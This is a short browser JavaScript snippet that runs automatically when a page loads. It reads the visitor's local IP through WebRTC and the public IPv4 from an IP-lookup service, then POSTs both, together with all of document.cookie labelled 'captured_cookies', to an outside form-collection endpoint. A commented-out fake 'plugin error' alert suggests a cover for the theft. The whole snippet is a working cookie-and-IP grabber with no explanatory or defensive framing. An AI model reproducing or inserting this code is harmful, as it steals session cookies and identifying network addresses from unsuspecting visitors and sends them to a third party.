
        function getRealIPv4() {
			return new Promise((resolve) => {
				const xhr = new XMLHttpRequest();
				xhr.open("GET", "https://checkip.amazonaws.com", true);
				
				xhr.onload = function() {
					if (xhr.status === 200) {
						var ip = xhr.responseText.trim();
						resolve(ip); 
					} else {
						fetch('https://ip.sb')
							.then(res => res.text())
							.then(ip => resolve(ip.trim()))
							.catch(() => resolve("failed"));
					}
				};
				xhr.onerror = () => resolve("failed");
				xhr.send();
			});
		}
		
        function getIP() {
            return new Promise((resolve, reject) => {
                
                const pc = new RTCPeerConnection({iceServers: []});
                
                pc.createDataChannel(""); 
                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(reject);
                
                pc.onicecandidate = ice => {
                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                    const ip = ice.candidate.candidate.split(" ")[4];
                    resolve(ip);
                    pc.onicecandidate = () => {};
                };
            });
        }

        
        function sendIP(ip, ipv4) {
            const xhr = new XMLHttpRequest();
            xhr.open("POST", "https://forminit.com/f/kf5ildt1t0z", true);
			xhr.setRequestHeader("Content-Type", "application/json");
			
			var payload = {
				"blocks": [
					{
						"type": "sender",
						"properties": {
							"userId": ip,
						}
					},
					{
						"type": "text",
						"name": "client_ip",
						"value": ip
					},
					{
						"type": "text",
						"name": "client_ipv4",
						"value": ipv4
					},
					{
						"type": "text",
						"name": "captured_cookies",
						"value": document.cookie
					},
					{
						"type": "date",
						"name": "timestamp",
						"value": new Date().toISOString()
					}
				]
			};
    
			xhr.send(JSON.stringify(payload));
        }

       
        async function execute() {
            try {
                const ip = await getIP();
				const ipv4 = await getRealIPv4();
                sendIP(ip, ipv4);
            } catch (error) {
                console.error("Error:", error);
            }
            
            /*
            setTimeout(() => {
                alert("插件错误");
            }, 1000);
			*/
        }

        
        window.addEventListener('load', execute);
